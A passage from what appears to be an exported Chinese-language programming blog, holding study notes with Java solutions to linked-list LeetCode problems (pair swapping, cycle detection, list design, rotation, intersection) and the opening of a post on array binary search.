class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>










<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 栈用于存储当前结果</span></span><br><span class="line">    <span class="comment">// 需要移除的数字数量</span></span><br><span class="line">    <span class="type">int</span>[] stack1 = <span class="keyword">new</span> <span class="title class_">int</span>[k.length];</span><br><span class="line">    <span class="type">int</span> top=-<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">toRemove</span> <span class="operator">=</span> k.length - n;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> num : k) &#123;</span><br><span class="line">        <span class="comment">// 如果栈非空且当前数字小于栈顶数字，并且栈中剩余数字数量足够</span></span><br><span class="line">        <span class="keyword">while</span> (toRemove &gt; <span class="number">0</span> &amp;&amp; top&gt;=<span class="number">0</span> &amp;&amp; stack1[top] &gt; num) &#123;</span><br><span class="line">            <span class="keyword">if</span>(top==<span class="number">0</span>&amp;&amp;num==<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            top--;</span><br><span class="line">            toRemove--;</span><br><span class="line">        &#125;</span><br><span class="line">        stack1[++top] = num;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果栈中的数字多于n个，只保留前n个</span></span><br><span class="line">    <span class="keyword">while</span> (top &gt; n-<span class="number">1</span>) &#123;</span><br><span class="line">        top--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span>[] result = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">    <span class="keyword">if</span> (top + <span class="number">1</span> &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        System.arraycopy(stack1, <span class="number">0</span>, result, <span class="number">0</span>, top + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Arrays.toString(result)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>设计模式与算法</category>
        <category>算法</category>
      </categories>
      <tags>
        <tag>动态规划算法</tag>
      </tags>
  </entry>
  <entry>
    <title>算法-链表</title>
    <url>/2024/08/26/%E7%AE%97%E6%B3%95-%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<p>参考：<a href="https://www.programmercarl.com/%E9%93%BE%E8%A1%A8%E6%80%BB%E7%BB%93%E7%AF%87.html#%E6%80%BB%E7%BB%93">代码随想录</a></p>
<h2 id="常用算法"><a href="#常用算法" class="headerlink" title="常用算法"></a>常用算法</h2><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/%E9%93%BE%E8%A1%A8%E6%80%BB%E7%BB%93.png"></p>
<h2 id="重要例题"><a href="#重要例题" class="headerlink" title="重要例题"></a>重要例题</h2><h3 id="虚拟头节点-24-两两交换节点"><a href="#虚拟头节点-24-两两交换节点" class="headerlink" title="(虚拟头节点) 24 两两交换节点"></a>(虚拟头节点) 24 两两交换节点</h3><p>题目：给你一个链表，两两交换其中相邻的节点，并返回交换后链表的头节点。你必须在不修改节点内部的值的情况下完成本题（即，只能进行节点交换）。<br>示例：<br>输入：head &#x3D; [1,2,3,4]<br>输出：head &#x3D; [2,1,4,3]</p>
<p>思路：引入虚拟头节点，将头节点化为普通节点，然后通过循环实现交换，每次循环执行如下步骤：<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240828102152.png" alt="基本步骤"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">swapPairs</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">virtualNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>, head);</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">currentNode</span> <span class="operator">=</span> virtualNode;</span><br><span class="line">    <span class="keyword">while</span> (currentNode.next != <span class="literal">null</span> &amp;&amp; currentNode.next.next != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">node1</span> <span class="operator">=</span> currentNode.next;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">node2</span> <span class="operator">=</span> currentNode.next.next;</span><br><span class="line">        currentNode.next = node2; <span class="comment">// 第一步</span></span><br><span class="line">        node1.next = node2.next;  <span class="comment">// 第二步</span></span><br><span class="line">        node2.next = node1;       <span class="comment">// 第三步</span></span><br><span class="line">        currentNode = currentNode.next.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> virtualNode.next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="双指针-19-删除链表的倒数第N个节点"><a href="#双指针-19-删除链表的倒数第N个节点" class="headerlink" title="(双指针) 19 删除链表的倒数第N个节点"></a>(双指针) 19 删除链表的倒数第N个节点</h3><p>题目：给你一个链表，删除链表的倒数第 n 个结点，并且返回链表的头结点。<br>示例：<br>输入：head &#x3D; [1,2,3,4,5], n &#x3D; 2<br>输出：[1,2,3,5]<br>输入：head &#x3D; [1], n &#x3D; 1<br>输出：[]</p>
<p>思路：</p>
<ol>
<li>首先引入虚拟头节点，将头节点化为普通节点处理。</li>
<li>利用快慢指针法，快指针比慢指针快n个节点，则快指针到达链表尾节点时，慢指针恰好位于需要被删除的节点前一个节点</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">removeNthFromEnd</span><span class="params">(ListNode head, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">virtualHead</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>,head);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fastNode</span> <span class="operator">=</span> virtualHead,slowNode = virtualHead;</span><br><span class="line">        <span class="keyword">while</span>(fastNode.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">            fastNode = fastNode.next;</span><br><span class="line">            <span class="keyword">if</span>(n&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                n--;    <span class="comment">// 快指针先移动到第n个节点</span></span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                slowNode = slowNode.next;   <span class="comment">// 快指针领先后，慢指针同步移动</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 结束循环时，快指针到达尾节点，慢指针到达被删除节点的前序节点</span></span><br><span class="line">        slowNode.next = slowNode.next.next;</span><br><span class="line">        <span class="keyword">return</span> virtualHead.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>


<h3 id="双指针-142-环形链表"><a href="#双指针-142-环形链表" class="headerlink" title="(双指针) 142 环形链表"></a>(双指针) 142 环形链表</h3><p>给定一个链表的头节点 head ，返回链表开始入环的第一个节点。 如果链表无环，则返回 null。如果链表中有某个节点，可以通过连续跟踪 next 指针再次到达，则链表中存在环。 为了表示给定链表中的环，评测系统内部使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。如果 pos 是 -1，则在该链表中没有环。注意：pos 不作为参数进行传递，仅仅是为了标识链表的实际情况。</p>
<p>示例：<br>输入：0 -&gt; 1 |<br>      |  &lt;- 2<br>输出：0</p>
<p>思路：</p>
<ol>
<li>判断是否存在环：使用快慢双指针，快指针每次移动2个节点，慢指针每次移动一个节点，若重逢，则表示存在环</li>
<li>寻找环的起点：分析快慢指针的移动，假设重逢时慢指针移动的距离为非环的x加环内y；则快指针移动的距离是x+y+n(y+z),n表示快指针转了几次环才碰到慢指针；而慢指针的移动速度是快指针的一半，因此其经过的路程也是一半，则有x+y &#x3D; 1&#x2F;2 [x+y+n(y+z)]，即x + y &#x3D; n (y + z)；进一步，入环的节点为x &#x3D; (n-1)y+nz；当n取1时，x&#x3D;z，也就是说，若使用两个指针分别从头节点和相遇节点开始移动，则当它们相遇时的节点即为入环节点。当n&#x3D;2时，x&#x3D;y+2z，同样在入环节点相遇，只不过从相遇节点起步的指针在环内绕了一圈。</li>
<li>总结：需要设置快慢指针，快指针每次移动2个单位，慢指针移动一个；相遇后慢指针回复到头节点，快指针每次移动一步，再次相遇，相遇节点即为入环节点。</li>
</ol>
<p>题解：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">detectCycle</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">fastNode</span> <span class="operator">=</span> head, slowNode = head;</span><br><span class="line">    <span class="keyword">while</span> (fastNode!=<span class="literal">null</span>&amp;&amp;fastNode.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">        fastNode = fastNode.next.next;</span><br><span class="line">        slowNode = slowNode.next;</span><br><span class="line">        <span class="keyword">if</span> (fastNode == slowNode)&#123;</span><br><span class="line">            slowNode = head;</span><br><span class="line">            <span class="keyword">while</span> (fastNode!=slowNode)</span><br><span class="line">            &#123;</span><br><span class="line">                fastNode = fastNode.next;</span><br><span class="line">                slowNode = slowNode.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> fastNode;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="链表结构-707-设计链表"><a href="#链表结构-707-设计链表" class="headerlink" title="(链表结构) 707 设计链表"></a>(链表结构) 707 设计链表</h3><p>MyLinkedList() 初始化 MyLinkedList 对象。<br>int get(int index) 获取链表中下标为 index 的节点的值。如果下标无效，则返回 -1 。<br>void addAtHead(int val) 将一个值为 val 的节点插入到链表中第一个元素之前。在插入完成后，新节点会成为链表的第一个节点。<br>void addAtTail(int val) 将一个值为 val 的节点追加到链表中作为链表的最后一个元素。<br>void addAtIndex(int index, int val) 将一个值为 val 的节点插入到链表中下标为 index 的节点之前。如果 index 等于链表的长度，那么该节点会被追加到链表的末尾。如果 index 比长度更大，该节点将 不会插入 到链表中。<br>void deleteAtIndex(int index) 如果下标有效，则删除链表中下标为 index 的节点。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Solution</span> <span class="variable">solution</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DesignLinkedList</span>().<span class="keyword">new</span> <span class="title class_">Solution</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//leetcode submit region begin(Prohibit modification and deletion)</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ListNode</span> &#123;</span><br><span class="line">        <span class="type">int</span> val;</span><br><span class="line">        ListNode next;</span><br><span class="line"></span><br><span class="line">        ListNode() &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ListNode(<span class="type">int</span> val) &#123;</span><br><span class="line">            <span class="built_in">this</span>.val = val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">MyLinkedList</span> &#123;</span><br><span class="line">        <span class="comment">//size存储链表元素的个数</span></span><br><span class="line">        <span class="type">int</span> size;</span><br><span class="line">        <span class="comment">//虚拟头结点</span></span><br><span class="line">        ListNode head;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">MyLinkedList</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.size = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">this</span>.head = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">            <span class="comment">//如果index非法，返回-1</span></span><br><span class="line">            <span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt;= size) &#123;</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">currentNode</span> <span class="operator">=</span> head;</span><br><span class="line">            <span class="comment">//包含一个虚拟头节点，所以查找第 index+1 个节点</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= index; i++) &#123;</span><br><span class="line">                currentNode = currentNode.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> currentNode.val;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtHead</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">            newNode.next = <span class="built_in">this</span>.head.next;</span><br><span class="line">            <span class="built_in">this</span>.head.next = newNode;</span><br><span class="line">            <span class="built_in">this</span>.size++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtTail</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">currentNode</span> <span class="operator">=</span> head;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                currentNode = currentNode.next;</span><br><span class="line">            &#125;</span><br><span class="line">            currentNode.next = newNode;</span><br><span class="line">            <span class="built_in">this</span>.size++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtIndex</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (index &gt; size) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (index &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                index = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">currentNode</span> <span class="operator">=</span> head;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index; i++) &#123;</span><br><span class="line">                currentNode = currentNode.next;</span><br><span class="line">            &#125;</span><br><span class="line">            newNode.next = currentNode.next;</span><br><span class="line">            currentNode.next = newNode;</span><br><span class="line">            <span class="built_in">this</span>.size++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteAtIndex</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">            <span class="comment">//如果index非法，返回-1</span></span><br><span class="line">            <span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt;= size) &#123;</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">currentNode</span> <span class="operator">=</span> head;</span><br><span class="line">            <span class="comment">//包含一个虚拟头节点，所以查找第 index+1 个节点</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index; i++) &#123;</span><br><span class="line">                currentNode = currentNode.next;</span><br><span class="line">            &#125;</span><br><span class="line">            currentNode.next = currentNode.next.next;</span><br><span class="line">            size--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>


<h2 id="其他例题"><a href="#其他例题" class="headerlink" title="其他例题"></a>其他例题</h2><h3 id="203-移除链表元素"><a href="#203-移除链表元素" class="headerlink" title="203 移除链表元素"></a>203 移除链表元素</h3><p>给你一个链表的头节点<code>head</code>和一个整数<code>val</code>，请你删除链表中所有满足<code>Node.val</code>&#x3D;&#x3D;<code>val</code>的节点，并返回<code>新的头节点</code>。</p>
<p>思路：移除链表元素时可以注意到头节点和其他节点的处理方法存在不同，因此一般有两种处理方法：</p>
<ul>
<li>头节点特殊处理</li>
<li>添加虚拟头节点</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 虚拟头节点法</span></span><br><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">removeElements</span><span class="params">(ListNode head, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>();</span><br><span class="line">    dummy.next = head;</span><br><span class="line"></span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> dummy;</span><br><span class="line">    <span class="keyword">while</span> (cur.next != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cur.next.val == val) &#123;</span><br><span class="line">            cur.next = cur.next.next;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dummy.next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 头节点特殊处理</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">removeElements</span><span class="params">(ListNode head, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span>(head!=<span class="literal">null</span> &amp;&amp; head.val==val) &#123;</span><br><span class="line">        head = head.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">curr</span> <span class="operator">=</span> head;</span><br><span class="line">    <span class="keyword">while</span>(curr!=<span class="literal">null</span> &amp;&amp; curr.next !=<span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(curr.next.val == val)&#123;</span><br><span class="line">            curr.next = curr.next.next;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            curr = curr.next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="206-翻转链表"><a href="#206-翻转链表" class="headerlink" title="206 翻转链表"></a>206 翻转链表</h3><p>时间复杂度O(n)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">while</span> (cur != <span class="literal">null</span>) &#123;</span><br><span class="line">        temp = cur.next;<span class="comment">// 保存下一个节点</span></span><br><span class="line">        cur.next = prev;</span><br><span class="line">        prev = cur;</span><br><span class="line">        cur = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> prev;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="链表成环-61-旋转链表"><a href="#链表成环-61-旋转链表" class="headerlink" title="(链表成环) 61 旋转链表"></a>(链表成环) 61 旋转链表</h3><p>给你一个链表的头节点 head ，旋转链表，将链表每个节点向右移动 k 个位置。</p>
<p>思路：首先通过让指针移动到链表尾部统计出链表的长度，然后将尾节点指向头节点（此时指针恰好指在尾节点，则其下一步会移动到头节点，链表成环！），最后让节点先移动到要被旋转成头节点的节点的前一个节点，将其的下一个节点指向空，断开环。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">rotateRight</span><span class="params">(ListNode head, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (k == <span class="number">0</span> || head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">iter</span> <span class="operator">=</span> head;</span><br><span class="line">    <span class="keyword">while</span> (iter.next != <span class="literal">null</span>) &#123;</span><br><span class="line">        iter = iter.next;</span><br><span class="line">        n++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">add</span> <span class="operator">=</span> n - k % n;</span><br><span class="line">    <span class="keyword">if</span> (add == n) &#123;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    iter.next = head;</span><br><span class="line">    <span class="keyword">while</span> (add-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        iter = iter.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">ret</span> <span class="operator">=</span> iter.next;</span><br><span class="line">    iter.next = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="双指针-82-去除链表中所有重复元素II"><a href="#双指针-82-去除链表中所有重复元素II" class="headerlink" title="(双指针) 82 去除链表中所有重复元素II"></a>(双指针) 82 去除链表中所有重复元素II</h3><p>给定一个已排序的链表的头<code>head</code>，删除原始链表中所有重复数字的节点，只留下不同的数字。返回已排序的链表。</p>
<p>示例：<br>输入：head &#x3D; [1,2,3,3,4,4,5]<br>输出：[1,2,5]</p>
<p>思路：使用指针current指向虚拟头节点，只要其有后继结点node和后继结点的后继结点next：若node和next的val相同，记录此val值，舍弃node(即current.next&#x3D;next)，最后即可舍弃所有重复值。若不相同，则此结点可以作为最终链表的结点，指针current指向此结点。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">deleteDuplicates</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">101</span>, head);</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">current</span> <span class="operator">=</span> dummy;</span><br><span class="line">    <span class="keyword">while</span> (current.next != <span class="literal">null</span> &amp;&amp; current.next.next != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (current.next.val == current.next.next.val) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">theSameNum</span> <span class="operator">=</span> current.next.val;</span><br><span class="line">            <span class="keyword">while</span> (current.next != <span class="literal">null</span> &amp;&amp; current.next.val == theSameNum) &#123;</span><br><span class="line">                current.next = current.next.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            current = current.next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dummy.next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>













































































<h3 id="面试：02-07-链表相交"><a href="#面试：02-07-链表相交" class="headerlink" title="面试：02.07 链表相交"></a>面试：02.07 链表相交</h3><p>题目：<br>给你两个单链表的头节点 headA 和 headB ，请你找出并返回两个单链表相交的起始节点。如果两个链表没有交点，返回 null 。题目数据 保证 整个链式结构中不存在环。注意，函数返回结果后，链表必须 保持其原始结构 。</p>
<p>示例：</p>
<p>思路：两个单链表从相交点的前一个节点开始到最后一个节点的长度是相同的，只需要统计出两个链表的长度差，让长的链表先走完差值节点，从相同长度的节点开始比对，就必能找到相交节点。<br>进一步，我们可以视为两个独立的链表，拼接成链表，将长链表头节点接到短链表尾节点后，视为表C；将短链表头节点接到长链表尾节点后，视为表D，同步遍历表C、D，必能到达相同节点，如：<br>A: 0 8 9 8 6 2<br>               5 2 1 3<br>B:       2 3 1<br>C: 0 8 9 8 6 2 5 2 1 3 2 3 1 <code>5</code> 2 1 3<br>D: 2 3 1 5 2 1 3 0 8 9 8 6 2 <code>5</code> 2 1 3<br>题解：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> &#123;</span><br><span class="line">    <span class="comment">// p1 指向 A 链表头结点，p2 指向 B 链表头结点</span></span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">p1</span> <span class="operator">=</span> headA, p2 = headB;</span><br><span class="line">    <span class="keyword">while</span> (p1 != p2) &#123;</span><br><span class="line">        <span class="comment">// p1 走一步，如果走到 A 链表末尾，转到 B 链表</span></span><br><span class="line">        <span class="keyword">if</span> (p1 == <span class="literal">null</span>)</span><br><span class="line">            p1 = headB;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            p1 = p1.next;</span><br><span class="line">        <span class="comment">// p2 走一步，如果走到 B 链表末尾，转到 A 链表</span></span><br><span class="line">        <span class="keyword">if</span> (p2 == <span class="literal">null</span>)</span><br><span class="line">            p2 = headA;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            p2 = p2.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>































































































































]]></content>
      <categories>
        <category>设计模式与算法</category>
        <category>算法</category>
      </categories>
      <tags>
        <tag>链表算法</tag>
      </tags>
  </entry>
  <entry>
    <title>算法-数组&amp;字符串</title>
    <url>/2024/08/28/%E7%AE%97%E6%B3%95-%E6%95%B0%E7%BB%84-%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<p>数组是非常基础的数据结构，一般数组算法题思维上都不是很难，但实现上可能需要注意：</p>
<ol>
<li>数组是存放在连续内存空间上的相同类型数据的集合。</li>
<li>数组下标都是从0开始的，其内存空间的地址是连续的</li>
<li>删除或增添元素就可能必须移动其他元素的地址</li>
<li>数组的元素是不能删的，只能覆盖。</li>
</ol>
<p>数组的经典题目中，常考四类思想（类型）：</p>
<ol>
<li>二分法<blockquote>
<p>循环不变量原则，在循环中坚持对区间的定义</p>
</blockquote>
</li>
<li>双指针<ul>
<li>快慢指针：通过一个快指针和慢指针在一个for循环下完成两个for循环的工作。</li>
<li>双向指针</li>
</ul>
</li>
<li>滑动窗口<blockquote>
<p>根据当前子序列和大小的情况，不断调节子序列的起始位置。</p>
</blockquote>
</li>
<li>前缀和</li>
</ol>
<p>还有一个常见的考察点就是利用循环模拟行为，如59题</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/%E6%95%B0%E7%BB%84%E6%80%BB%E7%BB%93.png" alt="数组算法的思想"></p>
<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h2 id="常用算法"><a href="#常用算法" class="headerlink" title="常用算法"></a>常用算法</h2><h3 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h3><p>二分查找法（Binary Search Algorithm），也被称为折半查找法，是一种在有序数组中查找特定元素的搜索算法。该算法的基本思想是，通过将要查找的数组分成两半，判断待查找的元素可能存在于哪一半中，然后继续在存在可能性的一半中继续查找，直到找到元素或确定元素不存在。这种搜索算法每一次比较都使搜索范围缩小一半，时间复杂度是log(n)。<br>二分查找法的前提是：</p>
<ul>
<li>上下界确定 </li>
<li>区间内有序（也可以是局部有序）</li>
<li>（数组中无重复元素）</li>
</ul>
<p>区间的定义决定了二分法的代码应该如何写，根据查找区间的类型，可以将二分法的编写分为两种：</p>
<ul>
<li>左闭右闭区间</li>
<li>左闭右开区间</li>
</ul>
<h4 id="左闭右闭区间下的二分查找法"><a href="#左闭右闭区间下的二分查找法" class="headerlink" title="左闭右闭区间下的二分查找法"></a>左闭右闭区间下的二分查找法</h4><p>因为定义target在[left, right]区间，所以有如下两点：</p>
<ul>
<li>while (left &lt;&#x3D; right) 要使用 &lt;&#x3D; ，因为left &#x3D;&#x3D; right是有意义的，所以使用 &lt;&#x3D;</li>
<li>if (nums[middle] &gt; target) right 要赋值为 middle - 1，因为当前这个nums[middle]一定不是target，那么接下来要查找的左区间结束下标位置就是 middle - 1。</li>
</ul>
<p>示例：</p>
